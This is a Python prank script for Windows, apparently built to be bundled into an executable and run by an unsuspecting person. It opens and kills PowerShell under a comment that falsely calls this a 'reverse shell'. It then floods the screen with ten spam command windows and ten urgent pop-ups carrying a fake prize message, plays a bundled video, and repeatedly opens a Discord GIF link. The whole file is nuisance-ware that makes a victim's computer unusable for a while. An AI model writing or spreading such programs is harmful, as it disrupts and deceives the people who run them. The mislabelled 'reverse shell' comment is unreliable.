import webbrowser
import os
import time
import win32api
import threading
import sys


# stackoverflow code lol
def resource_path(relative_path):
    """ Get absolute path to resource, works for dev and for PyInstaller """
    try:
        # PyInstaller creates a temp folder and stores path in _MEIPASS
        base_path = sys._MEIPASS
    except Exception:
        base_path = os.path.abspath(".")

    return os.path.join(base_path, relative_path)


# reverse shell pramk ahahaha lolololol
os.system('start powershell & taskkill /IM powershell.exe')
time.sleep(4)  # kalm before the storm


# spam alerts
def spam_alert():
    for j in range(0, 10):
        win32api.MessageBox(0, 'no virus free download 人生録音中国語韓国人世界遺産ss 1080p',
                            'You won an amogis vip card!!!1!!', 0x00001000)  # Hex value for urgent alerts


# start spamming
for i in range(0, 10):
    os.system('start cmd /k "@echo off & color 2 ' + ('& echo WHEN THE IMPOSTOR IS SUS' * 200) + '"')

# make sure they busy closing this while sussy video is loading
threading.Thread(target=spam_alert).start()

# Play sussy video, runs in parallel with the above code due to threading
os.system('start ' + resource_path('sussy.mp4'))

# open the sussy
for i in range(0, 10):
    time.sleep(1)
    webbrowser.open("https://media.discordapp.net/attachments/774432520191082507/776112892240068638/image0.gif")
